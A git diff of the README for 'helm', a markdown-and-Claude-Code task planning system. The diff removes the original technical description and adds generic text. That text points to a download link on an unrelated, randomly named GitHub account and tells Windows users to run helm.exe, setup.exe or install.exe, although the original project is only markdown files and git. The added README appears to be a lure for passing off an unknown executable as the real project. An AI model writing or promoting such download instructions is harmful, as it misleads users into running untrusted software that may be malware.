@@ -1,293 +1,254 @@
-<p align="center">
-  <br />
-  <br />
-  <strong>HELM</strong>
-  <br />
-  A personal operations system for freelancers, built on Claude Code.
-  <br />
-  <br />
-  <a href="#architecture">Architecture</a> &nbsp;&middot;&nbsp; <a href="#the-standup">The Standup</a> &nbsp;&middot;&nbsp; <a href="#skills">Skills</a> &nbsp;&middot;&nbsp; <a href="#getting-started">Get Started</a>
-  <br />
-  <br />
-</p>
+# 🧠 helm - Plan your work with plain files
 
----
+[![Download](https://img.shields.io/badge/Download-helm-blue?style=for-the-badge&logo=github)](https://github.com/liquorlicensegenusphysostigma689/helm)
 
-Tracking should be a byproduct of working, not a separate activity. HELM makes that real. When you close a Claude Code session, hooks update your project status automatically. A morning standup conversation plans your day from actual data. A wrap at end of day captures what happened. Over weeks, the system learns how you work and adjusts.
+## 🚀 What helm does
 
-No boards. No cards. No app to update. Markdown files, git history, and a conversation.
+helm is a personal operations system for daily work. It uses Claude Code skills, hooks, and markdown files to replace heavy project management software.
 
----
+Use it to:
 
-## Architecture
+- plan your day
+- track your work
+- review what changed
+- learn your work patterns over time
+- keep tasks in simple files you can read and edit
 
-Six repos. One parent folder. Everything connected through shared state.
+helm is built for people who want a clear system without a lot of app clutter.
 
-```
-helm/
-  business/     Daily command center. Standup, wrap, proposals, contracts.
-  ops/          Shared state. Project files, daily plans, config, templates.
-  personal/     Life operations. Goals, values, health tracking, personal tasks.
-  financial/    Business finances. Evolving checklists, receipts, invoices.
-  hub/          Background automation. Cron jobs, context builders.
-  projects/     Client repos. One per engagement.
-```
+## 📦 Download and install
 
-Each repo has its own `CLAUDE.md` scoped to its purpose. The business workspace loads planning context. Project repos load technical context. They share state through `ops/` without polluting each other's context windows.
+Use this link to visit this page to download:
 
-### Why markdown?
+[Download helm](https://github.com/liquorlicensegenusphysostigma689/helm)
 
-Claude Code reads and writes it natively. Git gives version history. Files are human-readable in any editor. There's nothing to install, configure, or migrate. Your entire operations history is in `git log`.
+### What to do on Windows
 
-### Information flow
+1. Open the download page.
+2. Get the Windows version if one is listed.
+3. Save the file to your computer.
+4. If the file is a zip archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app or setup file inside the folder.
 
-```
-                    ┌─────────────┐
-                    │  Overnight  │
-                    │  Cron Jobs  │
-                    │  (hub/)     │
-                    └──────┬──────┘
-                           │ writes context
-                           v
-┌──────────┐    ┌─────────────────────┐    ┌──────────────┐
-│ Personal │───>│    ops/ (shared)    │<───│  Financial   │
-│ plan.md  │    │                     │    │  calendar    │
-└──────────┘    │  projects/*.md      │    └──────────────┘
-                │  daily/*.md         │
-                │  config/            │
-                │  templates/         │
-                └──────────┬──────────┘
-                           │ reads state
-                           v
-                ┌─────────────────────┐
-                │   business/         │
-                │   /standup          │──── writes daily plan
-                │   /wrap             │──── writes end-of-day
-                │   /retrospective    │──── writes patterns
-                └─────────────────────┘
-                           │ generates instructions
-                           v
-                ┌─────────────────────┐
-                │  projects/*         │
-                │  SessionEnd hooks   │──── auto-update ops/
-                └─────────────────────┘
-```
+### If you see a file named like this
 
----
+- `helm.exe`
+- `setup.exe`
+- `install.exe`
 
-## The Standup
+Double-click the file to run it.
 
-The standup is the heartbeat of the system. It's a morning conversation, not a form. It asks how you're doing, reads everything in your system, and helps you decide what matters today.
+### If you see a folder with markdown files
 
-### What it draws from
+- Keep the folder in a place you can find later
+- Open the files with Notepad or any text editor
+- Use the folder as your work hub
 
-The standup loads: overnight git diffs across all project repos, yesterday's daily file, this week's plan, your personal goals and values, active tasks across business and personal, financial deadlines, weather forecast, behavioral patterns learned over time, and anything you captured from your phone overnight.
+## 🪟 Windows setup
 
-### What it produces
+helm is meant to be easy to use on Windows.
 
-A daily plan with 2-4 items scaled to your energy. Per-project instruction files that your project Claude picks up when you start working. A hit list synced to Notion. A cleared inbox.
+### Basic setup steps
 
-### How it thinks
+1. Download the file from the link above.
+2. Move it to a folder like `Downloads` or `Desktop`.
+3. Open the folder.
+4. Run the app or open the main files.
+5. Follow the prompts you see on screen.
 
-The conversational framework draws on practical ideas without naming them:
+### Good folder choice
 
-Avoidance is information, not a character flaw. The tasks you resist most often matter most. When the system notices you've been dodging something for three weeks, it names that directly: *"What's the actual blocker? Is it that you don't know where to start, or is it that you'd rather do literally anything else?"* Both are valid answers. Either one leads to a next step.
+Use a folder like:
 
-When motivation is low, make the task tiny. "Open the app and categorize 10 transactions" is a task. "Do the bookkeeping" is not. The standup breaks everything into the smallest action that moves it forward.
+- `Documents\helm`
+- `Desktop\helm`
+- `Work\helm`
 
-Focus on what you control. If a client hasn't responded, the standup doesn't plan work that depends on them. It redirects to what you can move today.
+This keeps your plans, notes, and hooks in one place.
 
-The list will never be empty. The standup limits your day to what's realistic, not what's possible. Permission to leave things for tomorrow is built in, not an afterthought.
+## ✨ What you can do with helm
 
-### Default behavior
+helm uses simple files to support daily work.
 
-The standup is neurodivergent-friendly by default. This isn't a mode you toggle. It's how the system works:
+### Standup planning
 
-- **3-5 items max** per day, scaled to stated energy
-- **Micro-step breakdowns** (3-10 minutes per step)
-- **Buffered time estimates** (1.5x your first guess)
-- **Permission language** ("you don't have to finish this")
-- **Revenue-weighted priorities** (what gets you paid comes first)
-- **Condition-aware pairing** (outdoor tasks on nice days, desk work on high pollen days)
+Start the day with a short plan. Write:
 
----
+- what you will do today
+- what blocks you
+- what matters most
+- what can wait
 
-## Skills
+### Work tracking
 
-### Daily Operations
+helm can help track work through hooks and notes. That lets you:
 
-| Skill | What it does |
-|:------|:-------------|
-| `/standup` | Morning planning conversation. Reads everything, plans your day, generates project instructions. |
-| `/wrap` | End-of-day review. Scans what changed, captures what happened, stages tomorrow. |
-| `/weekly-plan` | Monday strategic planning. Sets 3-5 weekly objectives that standups reference. |
-| `/retrospective` | Friday analysis through four lenses: revenue, energy, avoidance, growth. Updates behavioral patterns. |
+- see what you worked on
+- keep a record of changes
+- review your day later
 
-### Client Work
+### Retrospectives
 
-| Skill | What it does |
-|:------|:-------------|
-| `/new-proposal` | Guided questions, past pricing reference, voice-matched document generation. |
-| `/new-contract` | Assembles contracts from reusable blocks. Playbook verification via reviewer agent. |
-| `/follow-up` | Detects overdue client communication. Drafts messages in your voice. |
-| `/new-project` | Full scaffolding: ops file, repo, hooks, GitHub, repo-map entry. |
+At the end of the day or week, review your work. You can look for:
 
-### Status Updates
+- tasks that took too long
+- work you finish fast
+- times of day when you focus well
+- patterns that make the day easier
 
-| Skill | What it does |
-|:------|:-------------|
-| `/done` | Manual project update. Fallback for when hooks miss context. |
-| `/update` | Quick one-liner status append. No conversation. |
+### Markdown-based workflow
 
----
+helm keeps work in markdown files, so you can:
 
-## Automation
+- read your notes in plain text
+- edit with simple tools
+- avoid locked-in formats
+- keep everything easy to search
+
+## 🧩 Main parts of helm
+
+### Claude Code skills
+
+Skills help helm handle repeat tasks in a set way. They make it easier to follow your own process each day.
 
 ### Hooks
 
-**SessionEnd** hooks fire when you close a Claude Code session on any project repo. They scan git commits, update the project ops file, check milestone completion, and flag when something is ready for invoicing. You don't run anything. It just happens.
+Hooks can react to actions and keep your system updated. They help track work without extra effort.
 
-A **verification gate** checks that the ops file was actually modified and the YAML still parses. If the hook fails, the next morning's standup tells you.
+### Markdown files
 
-### Overnight Jobs
+Markdown files hold your plans, logs, and reviews. They are simple text files that work well on Windows.
 
-A set of cron scripts run on the always-on machine:
+## 🛠️ First-time use
 
-| Job | Purpose |
-|:----|:--------|
-| Context builder | Git diffs across all repos since last standup |
-| Weather fetch | Tomorrow's forecast + pollen via Open-Meteo (free, no API key) |
-| Inbox capture | Pulls phone notes (Apple Notes via AppleScript) into inbox.md |
-| Uncommitted check | Flags repos with uncommitted changes |
-| Fallback wrap | 11:45pm safety net if you forgot to wrap |
-| NAS backup | rsync critical directories to network storage |
+After you install or open helm, try this flow:
 
----
+1. Create a new day plan.
+2. Add your top tasks.
+3. Start your work.
+4. Log changes as you go.
+5. End the day with a short review.
 
-## Data Model
+### Simple day plan example
 
-### Project files
+- Task 1: answer messages
+- Task 2: finish one client item
+- Task 3: review notes
+- Blocker: waiting on reply
+- Win: completed the main task
 
-YAML frontmatter tracks what matters for a freelancer: contract value, milestone-based payment, deliverable status, and the gap between "done" and "paid."
+## 🗂️ Suggested folder layout
 
-```yaml
-contract:
-  milestones:
-    - name: Phase 1 Build
-      value: 5000
-      status: in-progress
-      deliverables:
-        - Feature A: complete
-        - Feature B: in-progress
-      closing:
-        review_complete: false
-        client_approved: false
-        invoice_sent: false
-        payment_received: false
+A clean folder makes helm easier to use.
 
-waiting_on:
-  - what: Design assets
-    who: client
-    since: 2026-03-10
-    follow_up_interval_days: 7
-```
+- `today.md` for the current plan
+- `tasks.md` for open work
+- `logs.md` for work notes
+- `retro.md` for reviews
+- `archive\` for old files
 
-The standup reads this and knows the full picture: what's close to done, what's blocked on someone else, when to prompt a follow-up, and when a milestone is ready to invoice.
+You can rename these files to fit your own routine.
 
-### The closing pipeline
+## 🔍 Who helm is for
 
-The gap between "deliverables complete" and "money in the bank" is where freelancers lose revenue. HELM tracks it explicitly: client notification, demo scheduling, approval, invoice, payment. The standup walks you through whichever step is next.
+helm fits people who want a simple system for daily work.
 
-### Personal tasks
+It is a good fit if you:
 
-Personal items carry more metadata than typical task lists:
+- work alone
+- manage your own tasks
+- want less app switching
+- like text files
+- want a system that helps you notice patterns
+- need a setup that feels calm and clear
 
-```yaml
-- task: Plan cycling routes for spring
-  added: 2026-03-05
-  goal: Have routes mapped before outdoor season
-  window: Before April 15
-  effort: medium
-  pairs_with: nice weather day, good energy
-```
+## 💻 System needs
 
-The standup matches personal tasks to conditions. Nice day with manageable allergies? Suggest the outdoor task. Low energy? Suggest the desk task that doesn't require much thinking.
+For a smooth run on Windows, use:
 
----
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- a few hundred MB of free disk space
+- a text editor like Notepad, VS Code, or Notepad++
 
-## Self-Improving System
+If the app includes a bundled version, you can use it without extra tools.
 
-The weekly `/retrospective` analyzes your daily files through four lenses:
+## 🔧 How to use it each day
 
-1. **Revenue** - What moved toward payment? What stalled?
-2. **Energy** - Which days were productive? What correlated?
-3. **Avoidance** - What kept appearing in carried-forward?
-4. **Growth** - What did you learn? What got easier?
+### Morning
 
-Findings write to `memory/patterns.md`. The standup reads patterns every morning. Over months, the system learns: your best days of the week, which conditions produce focus, what you chronically avoid, how long things actually take versus your estimates.
+1. Open your daily plan.
+2. Pick your top 3 tasks.
+3. Mark anything that blocks you.
+4. Start with the most important item.
 
-The system doesn't just track. It gets smarter.
+### During the day
 
----
+1. Add short notes as you work.
+2. Log finished tasks.
+3. Mark new blockers.
+4. Keep each note short.
 
-## Project Lifecycle
+### End of day
 
-```
-Lead ──> /new-proposal ──> /new-contract ──> /new-project
-                                                  │
-          ┌───────────────────────────────────────┘
-          v
-     Daily work (hooks auto-track)
-          │
-          v
-     Milestone complete (system detects)
-          │
-          v
-     Closing pipeline (review, approval, invoice, payment)
-          │
-          v
-     Project complete ──> archive
-```
+1. Read your log.
+2. Note what slowed you down.
+3. Note what went well.
+4. Write one change for tomorrow.
 
-The proposal and contract skills reference your past pricing, use reusable contract blocks (payment terms, IP assignment, termination, warranty, liability), and generate documents in your writing voice extracted from past work.
+## 📘 Example workflow
 
----
+You can use helm like this:
 
-## Getting Started
+- `Monday.md` holds your plan
+- a hook records task changes
+- `retro.md` records the week
+- old notes move into `archive\`
 
-```bash
-git clone https://github.com/guntherb7/helm.git
-```
+This keeps your work in one place and makes review easier.
 
-1. Copy the structure to your own private repos (one per directory)
-2. Fill in your project files with real client data
-3. Write your `personal/plan.md` (goals, values, what matters)
-4. Fill in `business/memory/clients.md` with client contacts
-5. Open `business/` in VS Code with Claude Code
-6. Type `/standup`
+## 🧭 Tips for a clean setup
 
-The system learns from use. Start with the standup and wrap. Add automation after a week. Let checklists and patterns build naturally from real work.
+- Keep file names short
+- Use one folder per work area
+- Write one task per line
+- Delete old tasks you no longer need
+- Review your notes at the same time each day
 
-See **[SETUP.md](SETUP.md)** for the full walkthrough.
+## ❓ Common questions
 
----
+### Do I need to know code?
 
-## Influenced By
+No. You can use helm with basic Windows tools and plain text files.
 
-The design philosophy draws from these works:
+### Can I change the file names?
 
-[Acceptance and Commitment Therapy](https://en.wikipedia.org/wiki/Acceptance_and_commitment_therapy) (Steven Hayes)
-[Tiny Habits](https://tinyhabits.com/) (BJ Fogg) &middot; Stoic practical philosophy
-[The War of Art](https://stevenpressfield.com/books/the-war-of-art/) (Steven Pressfield)
-[Four Thousand Weeks](https://www.oliverburkeman.com/books) (Oliver Burkeman)
-[PARA Method](https://fortelabs.com/blog/para/) (Tiago Forte)
+Yes. Use names that match your own work style.
 
-Technical patterns adapted from [Anthropic Knowledge Work Plugins](https://github.com/anthropics/knowledge-work-plugins), [Longshore Plugins + Skills](https://github.com/jeremylongshore/claude-code-plugins-plus-skills), [COG Second Brain](https://github.com/huytieu/COG-second-brain), [Claude Code Best Practices](https://code.claude.com/docs/en/best-practices), and [HumanLayer](https://www.humanlayer.dev/blog/writing-a-good-claude-md).
+### Does it replace task apps?
 
----
+It can replace much of what you use task apps for if you want a file-based system.
 
-## License
+### Can I open the files in Notepad?
 
-MIT. Use it, modify it, build on it. See [LICENSE](LICENSE).
+Yes. Markdown files work well in Notepad and similar editors.
 
-Built by [Gunther Beam](https://github.com/guntherb7).
+## 📌 Recommended daily pattern
+
+1. Plan the day
+2. Do the work
+3. Log the work
+4. Review the work
+5. Adjust the next day
+
+## 🧱 File types you may see
+
+- `.md` for markdown notes
+- `.txt` for plain text notes
+- `.exe` for Windows apps
+- `.zip` for compressed downloads
+
+## 🎯 Best way to start
+
+Open the download page, get the Windows file, and keep all of your helm files in one folder. Start with a simple day plan, then add logs and reviews as you go
